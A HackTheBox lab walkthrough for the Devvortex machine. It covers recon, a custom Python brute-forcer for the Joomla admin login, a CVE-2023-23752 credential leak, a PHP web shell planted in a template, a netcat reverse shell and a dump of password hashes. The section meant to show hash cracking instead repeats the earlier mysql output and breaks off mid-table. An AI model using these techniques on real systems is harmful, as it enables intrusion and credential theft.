---
layout: page
title: Devvortex
description: Devvortex from HackTheBox.
img: 
importance: 4
category: HackTheBox
related_publications: false
---

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/devvortex/logo.png" title="HTB Devvortex Logo" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<h2>Link</h2>
<a href="https://app.hackthebox.com/machines/Devvortex">Room Link</a>

<br/>
<h2>Process</h2>

<br/>
Time to jump two feet in the the Devvortex!

Let's get the services running with good, ol' nmap.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/htb/devvortex]
└─$ sudo nmap -sC -sV -A -O -oN nmap 10.10.11.242
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-01 00:46 AEST
Nmap scan report for 10.10.11.242
Host is up (0.41s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://devvortex.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Device type: general purpose
Running: Linux 5.X
OS CPE: cpe:/o:linux:linux_kernel:5
OS details: Linux 5.0 - 5.14
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 3389/tcp)
HOP RTT       ADDRESS
1   197.17 ms 10.10.16.1
2   197.23 ms 10.10.11.242

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.61 seconds
```
{% endraw %}

<br />
Add the devvortex.htb from the title to the /etc/hosts file.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/htb/devvortex]
└─$ cat /etc/hosts              
127.0.0.1       localhost
127.0.1.1       kali
10.10.11.242    devvortex.htb


# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```
{% endraw %}

<br />
Run curl -I to pull the headers to try to identify technologies.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/htb/devvortex]
└─$ curl -I http://devvortex.htb
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Sat, 31 May 2025 14:48:02 GMT
Content-Type: text/html
Content-Length: 18048
Last-Modified: Tue, 12 Sep 2023 17:45:54 GMT
Connection: keep-alive
ETag: "6500a3d2-4680"
Accept-Ranges: bytes
```
{% endraw %}

<br />
Check the landing page the webserver is serving.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/devvortex/landing.png" title="Landing Page" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Check the landing page source code.

{% raw %}
```html
<!DOCTYPE html>
<html>

<head>
  <!-- Basic -->
  <meta charset="utf-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <!-- Mobile Metas -->
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
  <!-- Site Metas -->
  <meta name="keywords" content="" />
  <meta name="description" content="" />
  <meta name="author" content="" />

  <title>DevVortex</title>

  <!-- slider stylesheet -->
  <!-- slider stylesheet -->
  <link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/OwlCarousel2/2.3.4/assets/owl.carousel.min.css" />

  <!-- bootstrap core css -->
  <link rel="stylesheet" type="text/css" href="css/bootstrap.css" />

  <!-- fonts style -->
  <link href="https://fonts.googleapis.com/css?family=Open+Sans:400,700|Poppins:400,700&display=swap" rel="stylesheet">
  <!-- Custom styles for this template -->
  <link href="css/style.css" rel="stylesheet" />
  <!-- responsive style -->
  <link href="css/responsive.css" rel="stylesheet" />
</head>

<snip>

</html>
```
{% endraw %}

<br />
Check for the robots.txt file.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/devvortex/robots.png" title="Robots File" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Ffuf the website looking for directories.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/htb/devvortex]
└─$ ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://devvortex.htb/FUZZ -e .txt,.bak,.html -fw 6791

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://devvortex.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Extensions       : .txt .bak .html 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 6791
________________________________________________

images                  [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 306ms]
contact.html            [Status: 200, Size: 8884, Words: 3156, Lines: 290, Duration: 216ms]
about.html              [Status: 200, Size: 7388, Words: 2258, Lines: 232, Duration: 214ms]
css                     [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 251ms]
do.html                 [Status: 200, Size: 7603, Words: 2436, Lines: 255, Duration: 195ms]
portfolio.html          [Status: 200, Size: 6845, Words: 2083, Lines: 230, Duration: 212ms]
js                      [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 206ms]
:: Progress: [882236/882236] :: Job [1/1] :: 175 req/sec :: Duration: [1:29:16] :: Errors: 0 ::
```
{% endraw %}

<br />
Ffuf for subdomains.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/htb/devvortex]
└─$ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://devvortex.htb -H "Host: FUZZ.devvortex.htb" -fw 4

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://devvortex.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.devvortex.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 4
________________________________________________

dev                     [Status: 200, Size: 23221, Words: 5081, Lines: 502, Duration: 243ms]
:: Progress: [114441/114441] :: Job [1/1] :: 174 req/sec :: Duration: [0:10:10] :: Errors: 0 ::
```
{% endraw %}

<br />
Add the dev subdomain to the /etc/hosts.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/htb/devvortex]
└─$ cat /etc/hosts              
127.0.0.1       localhost
127.0.1.1       kali
10.10.11.242    devvortex.htb dev.devvortex.htb


# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```
{% endraw %}

<br />
Curl the new subdomain like we did before to fingerprint the tech.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/htb/devvortex]
└─$ curl -I http://dev.devvortex.htb
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Sat, 31 May 2025 14:59:41 GMT
Content-Type: text/html; charset=utf-8
Connection: keep-alive
Set-Cookie: 1daf6e3366587cf9ab315f8ef3b5ed78=t51coeqkd2r8bfclppf0b16jtp; path=/; HttpOnly
x-frame-options: SAMEORIGIN
referrer-policy: strict-origin-when-cross-origin
cross-origin-opener-policy: same-origin
Expires: Wed, 17 Aug 2005 00:00:00 GMT
Last-Modified: Sat, 31 May 2025 14:59:41 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
```
{% endraw %}

<br />
Check the landing page for the new dev subdomain.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/devvortex/devlanding.png" title="Dev Landing Page" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Check the source code for the landing page.

{% raw %}
```html
<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="utf-8">
  <meta content="width=device-width, initial-scale=1.0" name="viewport">

  <title>Devvortex</title>
  <meta content="" name="description">
  <meta content="" name="keywords">

  <!-- Favicons -->
  <link href="/media/templates/site/cassiopeia/assets/img/favicon.png" rel="icon">
  <link href="/media/templates/site/cassiopeia/assets/img/apple-touch-icon.png" rel="apple-touch-icon">

  <!-- Google Fonts -->
  <link href="https://fonts.googleapis.com/css?family=Open+Sans:300,300i,400,400i,600,600i,700,700i|Raleway:300,300i,400,400i,500,500i,600,600i,700,700i|Poppins:300,300i,400,400i,500,500i,600,600i,700,700i" rel="stylesheet">

  <!-- Vendor CSS Files -->
  <link href="/media/templates/site/cassiopeia/assets/vendor/aos/aos.css" rel="stylesheet">
  <link href="/media/templates/site/cassiopeia/assets/vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
  <link href="/media/templates/site/cassiopeia/assets/vendor/bootstrap-icons/bootstrap-icons.css" rel="stylesheet">
  <link href="/media/templates/site/cassiopeia/assets/vendor/boxicons/css/boxicons.min.css" rel="stylesheet">
  <link href="/media/templates/site/cassiopeia/assets/vendor/glightbox/css/glightbox.min.css" rel="stylesheet">
  <link href="/media/templates/site/cassiopeia/assets/vendor/swiper/swiper-bundle.min.css" rel="stylesheet">

  <!-- Template Main CSS File -->
  <link href="/media/templates/site/cassiopeia/assets/css/style.css" rel="stylesheet">


</head>

<snip>

</html>
```
{% endraw %}

<br />
Look and see if there is a robots.txt file.

{% raw %}
```bash
# If the Joomla site is installed within a folder
# eg www.example.com/joomla/ then the robots.txt file
# MUST be moved to the site root
# eg www.example.com/robots.txt
# AND the joomla folder name MUST be prefixed to all of the
# paths.
# eg the Disallow rule for the /administrator/ folder MUST
# be changed to read
# Disallow: /joomla/administrator/
#
# For more information about the robots.txt standard, see:
# https://www.robotstxt.org/orig.html

User-agent: *
Disallow: /administrator/
Disallow: /api/
Disallow: /bin/
Disallow: /cache/
Disallow: /cli/
Disallow: /components/
Disallow: /includes/
Disallow: /installation/
Disallow: /language/
Disallow: /layouts/
Disallow: /libraries/
Disallow: /logs/
Disallow: /modules/
Disallow: /plugins/
Disallow: /tmp
```
{% endraw %}

<br />
Check the /administrator/ directory that is listed in the robots.txt.  Notice the Joomla! installation.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/devvortex/administrator.png" title="Administrator" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Run joomscan to try and determine the version.

{% raw %}
```bash
    ____  _____  _____  __  __  ___   ___    __    _  _ 
   (_  _)(  _  )(  _  )(  \/  )/ __) / __)  /__\  ( \( )
  .-_)(   )(_)(  )(_)(  )    ( \__ \( (__  /(__)\  )  ( 
  \____) (_____)(_____)(_/\/\_)(___/ \___)(__)(__)(_)\_)
                        (1337.today)
   
    --=[OWASP JoomScan
    +---++---==[Version : 0.0.7
    +---++---==[Update Date : [2018/09/23]
    +---++---==[Authors : Mohammad Reza Espargham , Ali Razmjoo
    --=[Code name : Self Challenge
    @OWASP_JoomScan , @rezesp , @Ali_Razmjo0 , @OWASP

Processing http://dev.devvortex.htb ...



[+] FireWall Detector
[++] Firewall not detected

[+] Detecting Joomla Version
[++] Joomla 4.2.6

[+] Core Joomla Vulnerability
[++] Target Joomla core is not vulnerable

[+] Checking apache info/status files
[++] Readable info/status files are not found

[+] admin finder
[++] Admin page : http://dev.devvortex.htb/administrator/

[+] Checking robots.txt existing
[++] robots.txt is found
path : http://dev.devvortex.htb/robots.txt 

Interesting path found from robots.txt
http://dev.devvortex.htb/joomla/administrator/
http://dev.devvortex.htb/administrator/
http://dev.devvortex.htb/api/
http://dev.devvortex.htb/bin/
http://dev.devvortex.htb/cache/
http://dev.devvortex.htb/cli/
http://dev.devvortex.htb/components/
http://dev.devvortex.htb/includes/
http://dev.devvortex.htb/installation/
http://dev.devvortex.htb/language/
http://dev.devvortex.htb/layouts/
http://dev.devvortex.htb/libraries/
http://dev.devvortex.htb/logs/
http://dev.devvortex.htb/modules/
http://dev.devvortex.htb/plugins/                                                                                                                                                                                                           
http://dev.devvortex.htb/tmp/                                                                                                                                                                                                               
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
[+] Finding common backup files name                                                                                                                                                                                                        
[++] Backup files are not found                                                                                                                                                                                                             
                                                                                                                                                                                                                                            
[+] Finding common log files name                                                                                                                                                                                                           
[++] error log is not found                                                                                                                                                                                                                 
                                                                                                                                                                                                                                            
[+] Checking sensitive config.php.x file                                                                                                                                                                                                    
[++] Readable config files are not found                                                                                                                                                                                                    
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
Your Report : reports/dev.devvortex.htb/
```
{% endraw %}

<br />
Check the login request in the Burp to see the structure.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/devvortex/request.png" title="Login Request" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Search the GitHub for a Joomla brute-forcer.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/devvortex/githubbruteforce.png" title="GitHub Brute-Force" class="img-fluid rounded z-depth-1" %}
    </div>
</div>
<a href="https://github.com/ajnik/joomla-bruteforce/blob/master/joomla-brute.py">https://github.com/ajnik/joomla-bruteforce/blob/master/joomla-brute.py</a>

<br />
Download the brute-force script.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/htb/devvortex]
└─$ wget https://raw.githubusercontent.com/ajnik/joomla-bruteforce/refs/heads/master/joomla-brute.py --inet4-only
--2025-06-01 01:39:11--  https://raw.githubusercontent.com/ajnik/joomla-bruteforce/refs/heads/master/joomla-brute.py
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.109.133
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.109.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3772 (3.7K) [text/plain]
Saving to: ‘joomla-brute.py’

joomla-brute.py                                            100%[========================================================================================================================================>]   3.68K  --.-KB/s    in 0.001s  

2025-06-01 01:39:12 (4.30 MB/s) - ‘joomla-brute.py’ saved [3772/3772]

                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/htb/devvortex]
└─$ chmod +x joomla-brute.py
```
{% endraw %}

<br />
Run the code and notice the result.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/htb/devvortex]
└─$ sudo ./joomla-brute.py -u http://dev.devvortex.htb -w /usr/share/wordlists/rockyou.txt -usr admin
[sudo] password for kali: 
 admin:123456
```
{% endraw %}

<br />
Test the credentials and fail miserably.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/devvortex/fail.png" title="Failed Login" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Create a script to brute-force the password since the pre-built didn't work.

{% raw %}
```python
import requests
from bs4 import BeautifulSoup

def get_tag(response_text):
    soup = BeautifulSoup(response_text, 'html.parser')
    return (soup.find_all('input', type='hidden')[-1]).get('name')

def populate_data(passwd, longstring):
    data = {'username':'admin',
        'passwd':passwd,
        'option':'com_login',
        'task':'login',
        'return':'aW5kZXgucGhw',
        longstring:'1'}
    return data
    

url = 'http://dev.devvortex.htb/administrator/index.php'
headers = {'Content-Type': 'application/x-www-form-urlencoded'}

s = requests.Session()

response = s.get(url=url)
longstring = get_tag(response.text)

print('[*] Starting the scan')
with open('/usr/share/wordlists/rockyou.txt','r') as fs:
    for line in fs:
        passwd = line.rstrip('\n')
        dt = populate_data(passwd,longstring)
        r = s.post(url=url,headers=headers,data=dt)
        if 'do not match' in r.text:
            longstring = get_tag(r.text)
        else:
            print(f'[*] The password is: {passwd}')
            break
print('[*] Execution Finished')
```
{% endraw %}

<br />
Look-up the Joomla version in the Google looking for an exploit and find this CVE.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/devvortex/cve.png" title="CVE-2023-23752" class="img-fluid rounded z-depth-1" %}
    </div>
</div>
<a href="https://github.com/ThatNotEasy/CVE-2023-23752">https://github.com/ThatNotEasy/CVE-2023-23752</a>

<br />
Initiate the script.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/htb/devvortex/CVE-2023-23752]
└─$ python3 joomla.py
```
{% endraw %}

<br />
Run the script and get some credentials.

{% raw %}
```bash
██████╗ ██████╗  █████╗  ██████╗  ██████╗ ███╗   ██╗███████╗ ██████╗ ██████╗  ██████╗███████╗   ██╗ ██████╗ 
██╔══██╗██╔══██╗██╔══██╗██╔════╝ ██╔═══██╗████╗  ██║██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔════╝   ██║██╔═══██╗
██║  ██║██████╔╝███████║██║  ███╗██║   ██║██╔██╗ ██║█████╗  ██║   ██║██████╔╝██║     █████╗     ██║██║   ██║
██║  ██║██╔══██╗██╔══██║██║   ██║██║   ██║██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██║     ██╔══╝     ██║██║   ██║
██║  ██║██╔══██╗██╔══██║██║   ██║██║   ██║██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██║     ██╔══╝     ██║██║   ██║
██████╔╝██║  ██║██║  ██║╚██████╔╝╚██████╔╝██║ ╚████║██║     ╚██████╔╝██║  ██║╚██████╗███████╗██╗██║╚██████╔╝
╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝╚═╝      ╚═════╝ ╚═╝  ╚═╝ ╚═════╝╚══════╝╚═╝╚═╝ ╚═════╝ 
═════════════╦═════════════════════════════════╦════════════════════════════════════════════════════════════
╔════════════╩═════════════════════════════════╩═════════════════════════════╗
║ • AUTHOR                 |   PARI MALAM                                    ║
║ • GITHUB                 |   GITHUB.COM/PARI-MALAM                         ║
╔════════════════════════════════════════════════════════════════════════════╝
║ • OFFICIAL FORUM         |   DRAGONFORCE.IO                                ║
║ • OFFICIAL TELEGRAM      |   @DRAGONFORCE.IO                               ║
╚════════════════════════════════════════════════════════════════════════════╝
[CVE-2023-23752] - Authentication Bypass Information Leak on Joomla!

[1] - Single Scan
[2] - Massive Scan

[CVE-2023-23752]: 1

IP/Domain: dev.devvortex.htb

[CVE-2023-23752] - dev.devvortex.htb .: [Scanning!]

[+] Domain            : dev.devvortex.htb
[+] Database Type     : mysqli
[+] Database Prefix   : sd4fg_
[+] Database          : joomla
[+] Hostname          : localhost
[+] Username          : lewis
[+] Password          : P4ntherg0t1n5r3c0n##
```
{% endraw %}

<br />
Use the credentials to login to the Joomla installation.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/devvortex/dashboard.png" title="Dashboard" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Try to SSH using the password to test for password reuse.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/htb/devvortex/CVE-2023-23752]
└─$ ssh lewis@10.10.11.242                    
The authenticity of host '10.10.11.242 (10.10.11.242)' can't be established.
ED25519 key fingerprint is SHA256:RoZ8jwEnGGByxNt04+A/cdluslAwhmiWqG3ebyZko+A.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:13: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.242' (ED25519) to the list of known hosts.
lewis@10.10.11.242's password: 
Permission denied, please try again.
lewis@10.10.11.242's password:

┌──(kali㉿kali)-[~/Documents/htb/devvortex/CVE-2023-23752]
└─$ ssh root@10.10.11.242
root@10.10.11.242's password: 
Permission denied, please try again.
root@10.10.11.242's password:
```
{% endraw %}

<br />
Navigate to the Cassiopeia error.php.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/devvortex/error.png" title="error.php" class="img-fluid rounded z-depth-1" %}
    </div>
</div>
<a href="http://dev.devvortex.htb/administrator/index.php?option=com_template&id=223&file=L2Vycm9yLnBocA%3D%3D&isMedia=0">http://dev.devvortex.htb/administrator/index.php?option=com_template&id=223&file=L2Vycm9yLnBocA%3D%3D&isMedia=0</a>

<br />
Add the standard PHP one-liner and click save.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/devvortex/oneliner.png" title="PHP One-liner" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Use ls to test the remote code execution.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/devvortex/ls.png" title="ls" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Start a netcat listener.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/htb/devvortex]
└─$ sudo rlwrap nc -nlvp 443                                 
[sudo] password for kali: 
listening on [any] 443 ...
```
{% endraw %}

<br />
Use the revshells to get a payload for our parameter.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/devvortex/revshells.png" title="Revshells" class="img-fluid rounded z-depth-1" %}
    </div>
</div>
<a href="https://www.revshells.com/">https://www.revshells.com/</a>

<br />
Re-add the one-liner to the error.php file like before.  Use the revshells payload in the c parameter.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/devvortex/usepayload.png" title="Use Payload" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Check the listener and catch the shell.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/htb/devvortex]
└─$ sudo rlwrap nc -nlvp 443                                 
[sudo] password for kali: 
listening on [any] 443 ...
connect to [10.10.16.5] from (UNKNOWN) [10.10.11.242] 40662
www-data@devvortex:~/dev.devvortex.htb/templates/cassiopeia$ python3 -c 'import pty; pty.spawn("/bin/bash");'
<a$ python3 -c 'import pty; pty.spawn("/bin/bash");'
```
{% endraw %}

<br />
Check the configuration file.

{% raw %}
```php
<?php
class JConfig {
        public $offline = false;
        public $offline_message = 'This site is down for maintenance.<br>Please check back again soon.';
        public $display_offline_message = 1;
        public $offline_image = '';
        public $sitename = 'Development';
        public $editor = 'tinymce';
        public $captcha = '0';
        public $list_limit = 20;
        public $access = 1;
        public $debug = false;
        public $debug_lang = false;
        public $debug_lang_const = true;
        public $dbtype = 'mysqli';
        public $host = 'localhost';
        public $user = 'lewis';
        public $password = 'P4ntherg0t1n5r3c0n##';
        public $db = 'joomla';
        public $dbprefix = 'sd4fg_';
        public $dbencryption = 0;
        public $dbsslverifyservercert = false;
        public $dbsslkey = '';
        public $dbsslcert = '';
        public $dbsslca = '';
        public $dbsslcipher = '';
        public $force_ssl = 0;
        public $live_site = '';
        public $secret = 'ZI7zLTbaGKliS9gq';
        public $gzip = false;
        public $error_reporting = 'default';
        public $helpurl = 'https://help.joomla.org/proxy?keyref=Help{major}{minor}:{keyref}&lang={langcode}';
        public $offset = 'UTC';
        public $mailonline = true;
        public $mailer = 'mail';
        public $mailfrom = 'lewis@devvortex.htb';
        public $fromname = 'Development';
        public $sendmail = '/usr/sbin/sendmail';
        public $smtpauth = false;
        public $smtpuser = '';
        public $smtppass = '';
        public $smtphost = 'localhost';
        public $smtpsecure = 'none';
        public $smtpport = 25;
        public $caching = 0;
        public $cache_handler = 'file';
        public $cachetime = 15;
        public $cache_platformprefix = false;
        public $MetaDesc = '';
        public $MetaAuthor = true;
        public $MetaVersion = false;
        public $robots = '';
        public $sef = true;
        public $sef_rewrite = false;
        public $sef_suffix = false;
        public $unicodeslugs = false;
        public $feed_limit = 10;
        public $feed_email = 'none';
        public $log_path = '/var/www/dev.devvortex.htb/administrator/logs';
        public $tmp_path = '/var/www/dev.devvortex.htb/tmp';
        public $lifetime = 15;
        public $session_handler = 'database';
        public $shared_session = false;
        public $session_metadata = true;

        <snip>
```
{% endraw %}

<br />
Enumerate the database with the lewis credentials to get the logan hash.

{% raw %}
```bash
www-data@devvortex:~/dev.devvortex.htb$ mysql -u lewis -p
mysql -u lewis -p
Enter password: P4ntherg0t1n5r3c0n##

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 2661
Server version: 8.0.35-0ubuntu0.20.04.1 (Ubuntu)

Copyright (c) 2000, 2023, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show databases;
show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| joomla             |
| performance_schema |
+--------------------+
3 rows in set (0.00 sec)

mysql> use joomla;
use joomla;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
show tables;

<snip>

mysql> select * from sd4fg_users;
select * from sd4fg_users;
+-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+
| id  | name       | username | email               | password                                                     | block | sendEmail | registerDate        | lastvisitDate       | activation | params                                                                                                                                                  | lastResetTime | resetCount | otpKey | otep | requireReset | authProvider |
+-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+
| 649 | lewis      | lewis    | lewis@devvortex.htb | $2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u |     0 |         1 | 2023-09-25 16:44:24 | 2025-06-01 14:58:10 | 0          |                                                                                                                                                         | NULL          |          0 |        |      |            0 |              |
| 650 | logan paul | logan    | logan@devvortex.htb | $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12 |     0 |         0 | 2023-09-26 19:15:42 | NULL                |            | {"admin_style":"","admin_language":"","language":"","editor":"","timezone":"","a11y_mono":"0","a11y_contrast":"0","a11y_highlight":"0","a11y_font":"0"} | NULL          |          0 |        |      |            0 |              |
+-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+
2 rows in set (0.00 sec)

mysql> select username, password from sd4fg_users;
select username, password from sd4fg_users;
+----------+--------------------------------------------------------------+
| username | password                                                     |
+----------+--------------------------------------------------------------+
| lewis    | $2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u |
| logan    | $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12 |
+----------+--------------------------------------------------------------+
2 rows in set (0.00 sec)

mysql> exit
exit
Bye
```
{% endraw %}

<br />
Save the logan credentials to a file.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/htb/devvortex]
└─$ cat passes.txt              
logan:$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12
```
{% endraw %}

<br />
Use jonn to crack the password.

{% raw %}
```bash
www-data@devvortex:~/dev.devvortex.htb$ mysql -u lewis -p
mysql -u lewis -p
Enter password: P4ntherg0t1n5r3c0n##

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 2661
Server version: 8.0.35-0ubuntu0.20.04.1 (Ubuntu)

Copyright (c) 2000, 2023, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show databases;
show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| joomla             |
| performance_schema |
+--------------------+
3 rows in set (0.00 sec)

mysql> use joomla;
use joomla;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
show tables;

<snip>

mysql> select * from sd4fg_users;
select * from sd4fg_users;
+-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+
| id  | name       | username | email               | password                                                     | block | sendEmail | registerDate        | lastvisitDate       | activation | params                                                                                                                                                  | lastResetTime | resetCount | otpKey | otep | requireReset | authProvider |
+-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+
